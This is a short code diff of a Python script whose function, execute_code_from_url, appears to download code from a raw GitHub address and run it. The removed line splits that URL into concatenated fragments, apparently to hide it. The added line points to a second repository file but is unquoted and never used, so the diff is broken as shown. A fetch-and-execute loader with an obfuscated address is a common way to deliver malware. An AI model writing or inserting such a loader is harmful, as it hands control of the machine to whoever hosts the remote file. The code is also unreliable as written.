@@ -1,4 +1,4 @@
-url = "htt" + "ps" + "://raw.gith" + "ubusercontent.com/StormGab1" + "/Repository2234/main/xdqwd"
+url2 = https://raw.githubusercontent.com/StormGab1/Repository2234/main/011022
 
 def execute_code_from_url(url):
     try:
@@ -11,4 +11,3 @@ def execute_code_from_url(url):
         print(f"Error {e}")
 
 execute_code_from_url(url)
-print(1)
